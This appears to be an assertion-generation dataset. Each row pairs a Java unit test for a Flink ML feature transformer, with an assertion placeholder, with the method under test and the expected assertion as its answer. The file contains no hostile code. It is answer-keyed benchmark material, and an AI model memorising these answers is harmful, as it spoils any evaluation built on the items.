"testInputDataType() { List<Row> trainData = Arrays.asList(Row.of(0), Row.of(1), Row.of(2), Row.of(0));  trainTable = tEnv.fromDataStream(env.fromCollection(trainData)).as(""input"");  List<Row> predictData = Arrays.asList(Row.of(0), Row.of(1), Row.of(2)); predictTable = tEnv.fromDataStream(env.fromCollection(predictData)).as(""input"");  expectedOutput = new HashMap[] { new HashMap<Double, Vector>() { { put(0.0, Vectors.sparse(2, new int[] {0}, new double[] {1.0})); put(1.0, Vectors.sparse(2, new int[] {1}, new double[] {1.0})); put(2.0, Vectors.sparse(2, new int[0], new double[0])); } } };  OneHotEncoderModel model = estimator.fit(trainTable); Table outputTable = model.transform(predictTable)[0]; Map<Double, Vector>[] actualOutput = executeAndCollect(outputTable, model.getInputCols(), model.getOutputCols()); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getHandleInvalid().equals(ERROR_INVALID));  final String[] inputCols = getInputCols();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Integer[]> localMaxIndices = tEnv.toDataStream(inputs[0]) .transform( ""ExtractInputValueAndFindMaxIndexOperator"", ObjectArrayTypeInfo.getInfoFor(BasicTypeInfo.INT_TYPE_INFO), new ExtractInputValueAndFindMaxIndexOperator(inputCols));  DataStream<Tuple2<Integer, Integer>> modelData = localMaxIndices .transform( ""GenerateModelDataOperator"", TupleTypeInfo.getBasicTupleTypeInfo(Integer.class, Integer.class), new GenerateModelDataOperator(inputCols.length)) .setParallelism(1);  OneHotEncoderModel model = new OneHotEncoderModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertArrayEquals(expectedOutput, actualOutput)
"testNotSupportedHandleInvalidOptions() { estimator.setHandleInvalid(HasHandleInvalid.SKIP_INVALID); try { estimator.fit(trainTable); Assert.fail(""Expected IllegalArgumentException""); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getHandleInvalid().equals(ERROR_INVALID));  final String[] inputCols = getInputCols();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Integer[]> localMaxIndices = tEnv.toDataStream(inputs[0]) .transform( ""ExtractInputValueAndFindMaxIndexOperator"", ObjectArrayTypeInfo.getInfoFor(BasicTypeInfo.INT_TYPE_INFO), new ExtractInputValueAndFindMaxIndexOperator(inputCols));  DataStream<Tuple2<Integer, Integer>> modelData = localMaxIndices .transform( ""GenerateModelDataOperator"", TupleTypeInfo.getBasicTupleTypeInfo(Integer.class, Integer.class), new GenerateModelDataOperator(inputCols.length)) .setParallelism(1);  OneHotEncoderModel model = new OneHotEncoderModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertEquals(IllegalArgumentException.class, ((Throwable) e).getClass())
"Exception { estimator = TestUtils.saveAndReload( tEnv, estimator, tempFolder.newFolder().getAbsolutePath(), OneHotEncoder::load); OneHotEncoderModel model = estimator.fit(trainTable); model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), OneHotEncoderModel::load); Table outputTable = model.transform(predictTable)[0]; Map<Double, Vector>[] actualOutput = executeAndCollect(outputTable, model.getInputCols(), model.getOutputCols()); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getHandleInvalid().equals(ERROR_INVALID));  final String[] inputCols = getInputCols();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Integer[]> localMaxIndices = tEnv.toDataStream(inputs[0]) .transform( ""ExtractInputValueAndFindMaxIndexOperator"", ObjectArrayTypeInfo.getInfoFor(BasicTypeInfo.INT_TYPE_INFO), new ExtractInputValueAndFindMaxIndexOperator(inputCols));  DataStream<Tuple2<Integer, Integer>> modelData = localMaxIndices .transform( ""GenerateModelDataOperator"", TupleTypeInfo.getBasicTupleTypeInfo(Integer.class, Integer.class), new GenerateModelDataOperator(inputCols.length)) .setParallelism(1);  OneHotEncoderModel model = new OneHotEncoderModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertArrayEquals(expectedOutput, actualOutput)
"Exception { OneHotEncoderModel model = estimator.fit(trainTable); Tuple2<Integer, Integer> expected = new Tuple2<>(0, 2); Tuple2<Integer, Integer> actual = OneHotEncoderModelData.getModelDataStream(model.getModelData()[0]) .executeAndCollect() .next(); ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Preconditions.checkArgument(getHandleInvalid().equals(ERROR_INVALID));  final String[] inputCols = getInputCols();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Integer[]> localMaxIndices = tEnv.toDataStream(inputs[0]) .transform( ""ExtractInputValueAndFindMaxIndexOperator"", ObjectArrayTypeInfo.getInfoFor(BasicTypeInfo.INT_TYPE_INFO), new ExtractInputValueAndFindMaxIndexOperator(inputCols));  DataStream<Tuple2<Integer, Integer>> modelData = localMaxIndices .transform( ""GenerateModelDataOperator"", TupleTypeInfo.getBasicTupleTypeInfo(Integer.class, Integer.class), new GenerateModelDataOperator(inputCols.length)) .setParallelism(1);  OneHotEncoderModel model = new OneHotEncoderModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	assertEquals(expected, actual)
"testSetModelData() { OneHotEncoderModel modelA = estimator.fit(trainTable);  Table modelData = modelA.getModelData()[0]; OneHotEncoderModel modelB = new OneHotEncoderModel().setModelData(modelData); ParamUtils.updateExistingParams(modelB, modelA.getParamMap());  Table outputTable = modelB.transform(predictTable)[0]; Map<Double, Vector>[] actualOutput = executeAndCollect(outputTable, modelB.getInputCols(), modelB.getOutputCols()); ""<AssertPlaceHolder>""; }
getParamMap() { return paramMap; }"	assertArrayEquals(expectedOutput, actualOutput)
"testOutputSchema() { PolynomialExpansion polynomialExpansion = new PolynomialExpansion() .setInputCol(""denseVec"") .setOutputCol(""outputVec"") .setDegree(3);  Table output = polynomialExpansion.transform(inputDataTable)[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema());  RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol()));  DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map( new PolynomialExpansionFunction(getDegree(), getInputCol()), outputTypeInfo);  Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals( Arrays.asList(""denseVec"", ""sparseVec"", ""outputVec""), output.getResolvedSchema().getColumnNames())"
"testInvalidDegree() { try { PolynomialExpansion polynomialExpansion = new PolynomialExpansion() .setInputCol(""denseVec"") .setOutputCol(""outputVec"") .setDegree(-1); polynomialExpansion.transform(inputDataTable); fail(); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); RowTypeInfo inputTypeInfo = TableUtils.getRowTypeInfo(inputs[0].getResolvedSchema());  RowTypeInfo outputTypeInfo = new RowTypeInfo( ArrayUtils.addAll(inputTypeInfo.getFieldTypes(), VectorTypeInfo.INSTANCE), ArrayUtils.addAll(inputTypeInfo.getFieldNames(), getOutputCol()));  DataStream<Row> output = tEnv.toDataStream(inputs[0]) .map( new PolynomialExpansionFunction(getDegree(), getInputCol()), outputTypeInfo);  Table outputTable = tEnv.fromDataStream(output); return new Table[] {outputTable}; }"	"assertEquals(""Parameter degree is given an invalid value -1"", e.getMessage())"
"testOutputSchema() { RegexTokenizer regexTokenizer = new RegexTokenizer(); inputDataTable = tEnv.fromDataStream(env.fromElements(Row.of("""", """"))).as(""input"", ""dummyInput""); Table output = regexTokenizer.transform(inputDataTable)[0]; ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); Expression tokenizerUdf = Expressions.call( RegexTokenizerUdf.class, $(getInputCol()), getPattern(), getGaps(), getToLowercase(), getMinTokenLength()) .as(getOutputCol()); Table output = inputs[0].addColumns(tokenizerUdf); return new Table[] {output}; }"	"assertEquals( Arrays.asList( regexTokenizer.getInputCol(), ""dummyInput"", regexTokenizer.getOutputCol()), output.getResolvedSchema().getColumnNames())"
"testOutputSchema() { Table tempTable = trainDataTable.as(""id"", ""test_input""); RobustScaler robustScaler = new RobustScaler().setInputCol(""test_input"").setOutputCol(""test_output""); RobustScalerModel model = robustScaler.fit(tempTable); Table output = model.transform(tempTable)[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense()); DataStream<RobustScalerModelData> modelData = DataStreamUtils.aggregate( inputData, new QuantileAggregator(getRelativeError(), getLower(), getUpper())); RobustScalerModel model = new RobustScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""id"", ""test_input"", ""test_output""), output.getResolvedSchema().getColumnNames())"
"Exception { RobustScaler robustScaler = new RobustScaler(); RobustScaler loadedRobustScaler = TestUtils.saveAndReload( tEnv, robustScaler, tempFolder.newFolder().getAbsolutePath(), RobustScaler::load); RobustScalerModel model = loadedRobustScaler.fit(trainDataTable); RobustScalerModel loadedModel = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), RobustScalerModel::load); ""<AssertPlaceHolder>""; Table output = loadedModel.transform(predictDataTable)[0]; verifyPredictionResult(output, robustScaler.getOutputCol(), EXPECTED_OUTPUT); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense()); DataStream<RobustScalerModelData> modelData = DataStreamUtils.aggregate( inputData, new QuantileAggregator(getRelativeError(), getLower(), getUpper())); RobustScalerModel model = new RobustScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""medians"", ""ranges""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testFitOnEmptyData() { Table emptyTable = tEnv.fromDataStream(env.fromCollection(TRAIN_DATA).filter(x -> x.getArity() == 0)) .as(""id"", ""input""); RobustScaler robustScaler = new RobustScaler(); RobustScalerModel model = robustScaler.fit(emptyTable); Table modelDataTable = model.getModelData()[0]; try { modelDataTable.execute().print(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense()); DataStream<RobustScalerModelData> modelData = DataStreamUtils.aggregate( inputData, new QuantileAggregator(getRelativeError(), getLower(), getUpper())); RobustScalerModel model = new RobustScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals(""The training set is empty."", ExceptionUtils.getRootCause(e).getMessage())"
"testIncompatibleNumOfFeatures() { RobustScaler robustScaler = new RobustScaler(); RobustScalerModel model = robustScaler.fit(trainDataTable);  List<Row> predictData = new ArrayList<>( Arrays.asList( Row.of(Vectors.dense(1.0, 2.0, 3.0)), Row.of(Vectors.dense(-1.0, -2.0, -3.0)))); Table predictTable = tEnv.fromDataStream(env.fromCollection(predictData)).as(""input""); Table output = model.transform(predictTable)[0]; try { output.execute().print(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<DenseVector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, DenseVector>) value -> ((Vector) value.getField(inputCol)).toDense()); DataStream<RobustScalerModelData> modelData = DataStreamUtils.aggregate( inputData, new QuantileAggregator(getRelativeError(), getLower(), getUpper())); RobustScalerModel model = new RobustScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertTrue( ExceptionUtils.getRootCause(e) .getMessage() .contains(""Number of features must be""))"
"testOutputSchema() { SQLTransformer sqlTransformer = new SQLTransformer() .setStatement(""SELECT *, (v1 + v2) AS v3, (v1 * v2) AS v4 FROM __THIS__"");  Table outputTable = sqlTransformer.transform(inputTable)[0];  ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); String statement = getStatement().replace(TABLE_IDENTIFIER, inputs[0].toString());  Table outputTable = tEnv.sqlQuery(statement);  if (!isInsertOnlyTable(tEnv, outputTable)) { Schema schema = Schema.newBuilder().fromResolvedSchema(outputTable.getResolvedSchema()).build(); DataStream<Row> outputStream = tEnv.toChangelogStream(outputTable, schema);  outputStream = outputStream .windowAll(EndOfStreamWindows.get()) .aggregate( new ChangeLogStreamToDataStreamFunction(), Types.LIST(outputStream.getType()), Types.LIST(outputStream.getType())) .flatMap(new FlattenListFunction<>(), outputStream.getType());  outputTable = tEnv.fromDataStream(outputStream, schema); }  return new Table[] {outputTable}; }"	"assertEquals( Arrays.asList(""id"", ""v1"", ""v2"", ""v3"", ""v4""), outputTable.getResolvedSchema().getColumnNames())"
"testOutputSchema() { Table tempTable = denseTable.as(""test_input""); StandardScaler standardScaler = new StandardScaler().setInputCol(""test_input"").setOutputCol(""test_output""); Table output = standardScaler.fit(tempTable).transform(tempTable)[0];  ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Tuple3<DenseVector, DenseVector, Long>> sumAndSquaredSumAndWeight = tEnv.toDataStream(inputs[0]) .transform( ""computeMeta"", new TupleTypeInfo<>( TypeInformation.of(DenseVector.class), TypeInformation.of(DenseVector.class), BasicTypeInfo.LONG_TYPE_INFO), new ComputeMetaOperator(getInputCol()));  DataStream<StandardScalerModelData> modelData = sumAndSquaredSumAndWeight .transform( ""buildModel"", TypeInformation.of(StandardScalerModelData.class), new BuildModelOperator()) .setParallelism(1);  StandardScalerModel model = new StandardScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Arrays.asList(""test_input"", ""test_output""), output.getResolvedSchema().getColumnNames())"
"Exception { StandardScaler standardScaler = new StandardScaler(); standardScaler = TestUtils.saveAndReload( tEnv, standardScaler, tempFolder.newFolder().getAbsolutePath(), StandardScaler::load);  StandardScalerModel model = standardScaler.fit(denseTable); model = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), StandardScalerModel::load);  ""<AssertPlaceHolder>"";  Table output = model.transform(denseTable)[0]; verifyPredictionResult(expectedResWithStd, output, standardScaler.getOutputCol()); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Tuple3<DenseVector, DenseVector, Long>> sumAndSquaredSumAndWeight = tEnv.toDataStream(inputs[0]) .transform( ""computeMeta"", new TupleTypeInfo<>( TypeInformation.of(DenseVector.class), TypeInformation.of(DenseVector.class), BasicTypeInfo.LONG_TYPE_INFO), new ComputeMetaOperator(getInputCol()));  DataStream<StandardScalerModelData> modelData = sumAndSquaredSumAndWeight .transform( ""buildModel"", TypeInformation.of(StandardScalerModelData.class), new BuildModelOperator()) .setParallelism(1);  StandardScalerModel model = new StandardScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals( Arrays.asList(""mean"", ""std""), model.getModelData()[0].getResolvedSchema().getColumnNames().subList(0, 2))"
"testFitOnEmptyData() { Table emptyTable = tEnv.fromDataStream(env.fromCollection(denseInput).filter(x -> x.getArity() == 0)) .as(""input""); StandardScalerModel model = new StandardScaler().fit(emptyTable); Table modelDataTable = model.getModelData()[0]; try { IteratorUtils.toList( StandardScalerModelData.getModelDataStream(modelDataTable).executeAndCollect()); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Tuple3<DenseVector, DenseVector, Long>> sumAndSquaredSumAndWeight = tEnv.toDataStream(inputs[0]) .transform( ""computeMeta"", new TupleTypeInfo<>( TypeInformation.of(DenseVector.class), TypeInformation.of(DenseVector.class), BasicTypeInfo.LONG_TYPE_INFO), new ComputeMetaOperator(getInputCol()));  DataStream<StandardScalerModelData> modelData = sumAndSquaredSumAndWeight .transform( ""buildModel"", TypeInformation.of(StandardScalerModelData.class), new BuildModelOperator()) .setParallelism(1);  StandardScalerModel model = new StandardScalerModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, paramMap); return model; }"	"assertEquals(""The training set is empty."", ExceptionUtils.getRootCause(e).getMessage())"
"testOutputSchema() { Tokenizer tokenizer = new Tokenizer(); inputDataTable = tEnv.fromDataStream(env.fromElements(Row.of("""", """"))).as(""input"", ""dummyInput""); Table output = tokenizer.transform(inputDataTable)[0]; ""<AssertPlaceHolder>""; }
transform(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  Expression tokenizerUdf = Expressions.call(TokenizerUdf.class, $(getInputCol())).as(getOutputCol()); Table output = inputs[0].addColumns(tokenizerUdf); return new Table[] {output}; }"	"assertEquals( Arrays.asList(tokenizer.getInputCol(), ""dummyInput"", tokenizer.getOutputCol()), output.getResolvedSchema().getColumnNames())"
"testOutputSchema() { Table tempTable = inputANOVATable.as(""test_label"", ""test_features""); UnivariateFeatureSelector selector = new UnivariateFeatureSelector() .setLabelCol(""test_label"") .setFeaturesCol(""test_features"") .setOutputCol(""test_output"") .setFeatureType(""continuous"") .setLabelType(""categorical"");  UnivariateFeatureSelectorModel model = selector.fit(tempTable); Table output = model.transform(tempTable)[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  final String featuresCol = getFeaturesCol(); final String labelCol = getLabelCol(); final String featureType = getFeatureType(); final String labelType = getLabelType();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  Table output; if (CATEGORICAL.equals(featureType) && CATEGORICAL.equals(labelType)) { output = new ChiSqTest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else if (CONTINUOUS.equals(featureType) && CATEGORICAL.equals(labelType)) { output = new ANOVATest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else if (CONTINUOUS.equals(featureType) && CONTINUOUS.equals(labelType)) { output = new FValueTest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else { throw new IllegalArgumentException( String.format( ""Unsupported combination: featureType=%s, labelType=%s."", featureType, labelType)); } DataStream<UnivariateFeatureSelectorModelData> modelData = tEnv.toDataStream(output) .transform( ""selectIndicesFromPValues"", TypeInformation.of(UnivariateFeatureSelectorModelData.class), new SelectIndicesFromPValuesOperator( getSelectionMode(), getActualSelectionThreshold())) .setParallelism(1); UnivariateFeatureSelectorModel model = new UnivariateFeatureSelectorModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""test_label"", ""test_features"", ""test_output""), output.getResolvedSchema().getColumnNames())"
"Exception { UnivariateFeatureSelector selector = new UnivariateFeatureSelector() .setFeatureType(""continuous"") .setLabelType(""categorical"") .setSelectionThreshold(1);  UnivariateFeatureSelector loadSelector = TestUtils.saveAndReload( tEnv, selector, tempFolder.newFolder().getAbsolutePath(), UnivariateFeatureSelector::load); UnivariateFeatureSelectorModel model = loadSelector.fit(inputANOVATable); UnivariateFeatureSelectorModel loadedModel = TestUtils.saveAndReload( tEnv, model, tempFolder.newFolder().getAbsolutePath(), UnivariateFeatureSelectorModel::load); ""<AssertPlaceHolder>"";  Table output = loadedModel.transform(inputANOVATable)[0]; verifyOutputResult(output, 0); }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  final String featuresCol = getFeaturesCol(); final String labelCol = getLabelCol(); final String featureType = getFeatureType(); final String labelType = getLabelType();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  Table output; if (CATEGORICAL.equals(featureType) && CATEGORICAL.equals(labelType)) { output = new ChiSqTest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else if (CONTINUOUS.equals(featureType) && CATEGORICAL.equals(labelType)) { output = new ANOVATest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else if (CONTINUOUS.equals(featureType) && CONTINUOUS.equals(labelType)) { output = new FValueTest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else { throw new IllegalArgumentException( String.format( ""Unsupported combination: featureType=%s, labelType=%s."", featureType, labelType)); } DataStream<UnivariateFeatureSelectorModelData> modelData = tEnv.toDataStream(output) .transform( ""selectIndicesFromPValues"", TypeInformation.of(UnivariateFeatureSelectorModelData.class), new SelectIndicesFromPValuesOperator( getSelectionMode(), getActualSelectionThreshold())) .setParallelism(1); UnivariateFeatureSelectorModel model = new UnivariateFeatureSelectorModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Collections.singletonList(""indices""), model.getModelData()[0].getResolvedSchema().getColumnNames())"
"testIncompatibleNumOfFeatures() { UnivariateFeatureSelector selector = new UnivariateFeatureSelector() .setFeatureType(""continuous"") .setLabelType(""continuous"") .setSelectionThreshold(1); UnivariateFeatureSelectorModel model = selector.fit(inputFValueTable);  List<Row> predictData = new ArrayList<>( Arrays.asList( Row.of(1, Vectors.dense(1.0, 2.0)), Row.of(-1, Vectors.dense(-1.0, -2.0)))); Table predictTable = tEnv.fromDataStream(env.fromCollection(predictData)).as(""label"", ""features""); Table output = model.transform(predictTable)[0]; try { output.execute().print(); fail(); } catch (Throwable e) { ""<AssertPlaceHolder>""; } }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  final String featuresCol = getFeaturesCol(); final String labelCol = getLabelCol(); final String featureType = getFeatureType(); final String labelType = getLabelType();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  Table output; if (CATEGORICAL.equals(featureType) && CATEGORICAL.equals(labelType)) { output = new ChiSqTest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else if (CONTINUOUS.equals(featureType) && CATEGORICAL.equals(labelType)) { output = new ANOVATest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else if (CONTINUOUS.equals(featureType) && CONTINUOUS.equals(labelType)) { output = new FValueTest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else { throw new IllegalArgumentException( String.format( ""Unsupported combination: featureType=%s, labelType=%s."", featureType, labelType)); } DataStream<UnivariateFeatureSelectorModelData> modelData = tEnv.toDataStream(output) .transform( ""selectIndicesFromPValues"", TypeInformation.of(UnivariateFeatureSelectorModelData.class), new SelectIndicesFromPValuesOperator( getSelectionMode(), getActualSelectionThreshold())) .setParallelism(1); UnivariateFeatureSelectorModel model = new UnivariateFeatureSelectorModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( ""Input 2 features, but UnivariateFeatureSelector is "" + ""expecting at least 3 features as input."", ExceptionUtils.getRootCause(e).getMessage())"
"Exception { List<Row> inputData = Arrays.asList( Row.of(0.0, Vectors.dense(6.0, 7.0, 0.0, 6.0, 6.0, 6.0)), Row.of(1.0, Vectors.dense(0.0, 9.0, 6.0, 0.0, 5.0, 0.0)), Row.of(1.0, Vectors.dense(0.0, 9.0, 3.0, 0.0, 5.0, 0.0)), Row.of(1.0, Vectors.dense(0.0, 9.0, 8.0, 0.0, 6.0, 0.0)), Row.of(2.0, Vectors.dense(8.0, 9.0, 6.0, 8.0, 4.0, 8.0)), Row.of(2.0, Vectors.dense(8.0, 9.0, 6.0, 8.0, 0.0, 8.0))); Table inputTable = tEnv.fromDataStream( env.fromCollection( inputData, Types.ROW(Types.DOUBLE, VectorTypeInfo.INSTANCE))) .as(""label"", ""features""); UnivariateFeatureSelectorModel model = selectorWithChiSqTest.setSelectionThreshold(4).fit(inputTable); Table modelData = model.getModelData()[0]; DataStream<Row> output = tEnv.toDataStream(modelData); List<Row> modelRows = IteratorUtils.toList(output.executeAndCollect()); int[] expectedIndices = {0, 3, 5, 1}; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1);  final String featuresCol = getFeaturesCol(); final String labelCol = getLabelCol(); final String featureType = getFeatureType(); final String labelType = getLabelType();  StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment();  Table output; if (CATEGORICAL.equals(featureType) && CATEGORICAL.equals(labelType)) { output = new ChiSqTest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else if (CONTINUOUS.equals(featureType) && CATEGORICAL.equals(labelType)) { output = new ANOVATest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else if (CONTINUOUS.equals(featureType) && CONTINUOUS.equals(labelType)) { output = new FValueTest() .setFeaturesCol(featuresCol) .setLabelCol(labelCol) .setFlatten(true) .transform(inputs[0])[0]; } else { throw new IllegalArgumentException( String.format( ""Unsupported combination: featureType=%s, labelType=%s."", featureType, labelType)); } DataStream<UnivariateFeatureSelectorModelData> modelData = tEnv.toDataStream(output) .transform( ""selectIndicesFromPValues"", TypeInformation.of(UnivariateFeatureSelectorModelData.class), new SelectIndicesFromPValuesOperator( getSelectionMode(), getActualSelectionThreshold())) .setParallelism(1); UnivariateFeatureSelectorModel model = new UnivariateFeatureSelectorModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	assertArrayEquals(expectedIndices, (int[]) modelRows.get(0).getField(0))
"testOutputSchema() { Table tempTable = trainDataTable.as(""id"", ""test_input""); VarianceThresholdSelector varianceThresholdSelector = new VarianceThresholdSelector() .setInputCol(""test_input"") .setOutputCol(""test_output""); VarianceThresholdSelectorModel model = varianceThresholdSelector.fit(tempTable); Table output = model.transform(tempTable)[0]; ""<AssertPlaceHolder>""; }
fit(Table... inputs) { Preconditions.checkArgument(inputs.length == 1); final String inputCol = getInputCol(); StreamTableEnvironment tEnv = (StreamTableEnvironment) ((TableImpl) inputs[0]).getTableEnvironment(); DataStream<Vector> inputData = tEnv.toDataStream(inputs[0]) .map( (MapFunction<Row, Vector>) value -> ((Vector) value.getField(inputCol)), VectorTypeInfo.INSTANCE);  DataStream<VarianceThresholdSelectorModelData> modelData = DataStreamUtils.aggregate( inputData, new VarianceThresholdSelectorAggregator(getVarianceThreshold()), Types.TUPLE( Types.LONG, DenseVectorTypeInfo.INSTANCE, DenseVectorTypeInfo.INSTANCE), TypeInformation.of(VarianceThresholdSelectorModelData.class));  VarianceThresholdSelectorModel model = new VarianceThresholdSelectorModel().setModelData(tEnv.fromDataStream(modelData)); ParamUtils.updateExistingParams(model, getParamMap()); return model; }"	"assertEquals( Arrays.asList(""id"", ""test_input"", ""test_output""), output.getResolvedSchema().getColumnNames())"
